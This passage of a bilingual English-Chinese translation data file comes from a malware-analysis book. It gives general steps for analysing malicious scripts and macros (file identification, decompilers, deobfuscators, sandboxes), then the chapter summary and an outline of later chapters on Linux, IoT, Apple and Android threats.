  - PREF_UL
  type: TYPE_NORMAL
  zh: 查看使用的文件扩展名
- en: Use the **file** tool
  id: totrans-454
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用**file**工具
- en: Search for the header signature online
  id: totrans-455
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 在线搜索头部签名
- en: Check strings as they may give additional clues
  id: totrans-456
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: 检查字符串，因为它们可能提供额外的线索。
- en: If the script requires some particular OS, make sure that you have a proper
    VM image set up.
  id: totrans-457
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果脚本需要特定的操作系统，确保你已设置好适当的虚拟机镜像。
- en: If the script language is compiled, search for tools such as decompilers or
    disassemblers to make static analysis possible.
  id: totrans-458
  prefs: []
  type: TYPE_NORMAL
  zh: 如果脚本语言是编译型的，可以寻找如反编译器或反汇编器等工具，以便进行静态分析。
- en: If the code is not compiled and the source code has been obtained, check for
    the best IDE or syntax highlighter available. Use your preferred solution that
    supports debugging to make dynamic analysis more convenient.
  id: totrans-459
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果代码没有被编译且已获取源代码，检查可用的最佳IDE或语法高亮工具。使用你偏好的支持调试的解决方案，使动态分析更加方便。
- en: Search for manuals on how to read the code – either the original or the one
    that comes with the help files for the corresponding tools. Additionally, check
    whether there are some APIs available.
  id: totrans-460
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 查找关于如何阅读代码的手册——无论是原版手册还是与相应工具一起提供的帮助文件。此外，检查是否有可用的API。
- en: If the code is obfuscated, try existing deobfuscators if there are any. It is
    always possible to use code beautifiers and name replacements to make the code
    more readable.
  id: totrans-461
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果代码是混淆的，可以尝试现有的反混淆工具（如果有的话）。总是可以使用代码美化工具和命名替换来使代码更具可读性。
- en: Check whether any dynamic analysis monitors or sandboxes are available that
    can log all critical functionality when the code is being executed.
  id: totrans-462
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 检查是否有可用的动态分析监视器或沙箱，这些工具能够在代码执行时记录所有关键功能。
- en: Often, it is easier to review the output of dynamic analysis tools and then
    switch to static analysis so that you have some basic understanding of at least
    part of the functionality. Employ dynamic analysis when you need to decrypt some
    important block of data or when you want to understand the logic behind some piece
    of code.
  id: totrans-463
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通常，先审查动态分析工具的输出，再转向静态分析，这样可以对至少部分功能有一个基本的了解。当你需要解密某些重要数据块，或想理解某段代码背后的逻辑时，应该使用动态分析。
- en: Once you can analyze code, the next important step will be figuring out what
    to focus on.
  id: totrans-464
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你能够分析代码，下一个重要步骤就是弄清楚该关注什么内容。
- en: Questions to answer
  id: totrans-465
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 需要回答的问题
- en: Reverse engineering is not just an engineering task – often, it requires a certain
    amount of research and creativity to solve the corresponding challenges.
  id: totrans-466
  prefs: []
  type: TYPE_NORMAL
  zh: 逆向工程不仅仅是一个工程任务——通常，它需要一定的研究和创造力来解决相应的挑战。
- en: Usually, the analysis time is limited by circumstances. Therefore, pay particular
    attention to the functionality that will help answer the questions needed to complete
    the report. This part might be tricky because, without taking a look at everything,
    it is difficult to say whether the description is complete or not. Searching for
    the keywords of functions of interest and checking their references should be
    a good starting point. After this, it makes sense to check whether any block of
    code was encrypted, encoded, or loaded externally. Keeping your markup accurate
    will help you navigate the whole project and allow you to quickly come back later
    if necessary.
  id: totrans-467
  prefs: []
  type: TYPE_NORMAL
  zh: 通常，分析时间会受到环境的限制。因此，要特别关注能够帮助回答报告中所需问题的功能。这部分可能比较棘手，因为如果没有全面查看，难以判断描述是否完整。搜索感兴趣功能的关键字，并检查它们的引用，应该是一个不错的起点。之后，可以检查是否有代码块被加密、编码或外部加载。保持标记准确将帮助你在整个项目中导航，并在必要时快速返回。
- en: Summary
  id: totrans-468
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: In this chapter, we covered multiple script languages and document macros that
    are often misused by attackers. We described the motivation behind a malware writer’s
    decision when they are choosing a particular approach. Additionally, we explored
    ready-to-use recipes on how to solve particular challenges specific to each language
    and summarized what functionality to pay attention to. You also gained a good
    understanding of various tools that will drastically help speed up analysis.
  id: totrans-469
  prefs: []
  type: TYPE_NORMAL
  zh: 本章中，我们涵盖了多种脚本语言和文档宏，这些语言和宏通常被攻击者滥用。我们描述了恶意软件编写者在选择特定方法时的动机。此外，我们还探讨了如何解决每种语言特定挑战的现成方案，并总结了需要关注的功能。你还将深入了解多种工具，这些工具将大大加速分析过程。
- en: Finally, we covered generic approaches on how to handle malicious code written
    in virtually any script language that you may encounter. We also discussed the
    sequence of actions to follow to analyze malicious code efficiently.
  id: totrans-470
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们介绍了如何处理几乎任何脚本语言编写的恶意代码的通用方法，这些方法可能在你遇到的情况下会有所帮助。我们还讨论了高效分析恶意代码时需要遵循的行动顺序。
- en: After completing this chapter, you can now successfully perform static and dynamic
    analyses of various scripts, bypass anti-reversing techniques, and understand
    the core functionality of malware.
  id: totrans-471
  prefs: []
  type: TYPE_NORMAL
  zh: 完成本章后，你将能够成功地对各种脚本进行静态和动态分析，绕过反汇编技术，并理解恶意软件的核心功能。
- en: In [*Chapter 11*](B18500_11.xhtml#_idTextAnchor1188), *Dissecting Linux and
    IoT Malware*, we will explore threats that target various Linux-based and IoT
    systems, learn how to analyze them, and then learn how to extend some of the knowledge
    you have gained from this chapter.
  id: totrans-472
  prefs: []
  type: TYPE_NORMAL
  zh: 在 [*第11章*](B18500_11.xhtml#_idTextAnchor1188)，*剖析 Linux 和 IoT 恶意软件* 中，我们将探讨针对各种基于
    Linux 和物联网系统的威胁，学习如何分析这些威胁，并将如何延伸你从本章获得的部分知识。
- en: Part 4 Looking into IoT and Other Platforms
  id: totrans-473
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第四部分：探索物联网及其他平台
- en: This section is mainly focused on non-Windows platforms that have increasingly
    become a target of malware attacks. By going through it, you will understand the
    basic concepts behind the threats facing other PC, mobile, and embedded systems
    and will learn multiple techniques for their analysis.
  id: totrans-474
  prefs: []
  type: TYPE_NORMAL
  zh: 本节主要关注非 Windows 平台，这些平台已逐渐成为恶意软件攻击的目标。通过阅读本节内容，你将理解其他 PC、移动设备和嵌入式系统面临的威胁背后的基本概念，并学习多种分析技术。
- en: 'In this section are the following chapters:'
  id: totrans-475
  prefs: []
  type: TYPE_NORMAL
  zh: 本节包含以下章节：
- en: '[*Chapter 11*](B18500_11.xhtml#_idTextAnchor1188)*, Dissecting Linux and IoT
    Malware*'
  id: totrans-476
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[*第11章*](B18500_11.xhtml#_idTextAnchor1188)*, 剖析 Linux 和 IoT 恶意软件*'
- en: '[*Chapter 12*](B18500_12.xhtml#_idTextAnchor1327)*, Introduction to macOS and
    iOS Threats*'
  id: totrans-477
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[*第12章*](B18500_12.xhtml#_idTextAnchor1327)*, macOS 和 iOS 威胁概述*'
- en: '[*Chapter 13*](B18500_13.xhtml#_idTextAnchor1503)*, Analyzing Android Malware
    Samples*'
  id: totrans-478
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[*第13章*](B18500_13.xhtml#_idTextAnchor1503)*, 分析 Android 恶意软件样本*'
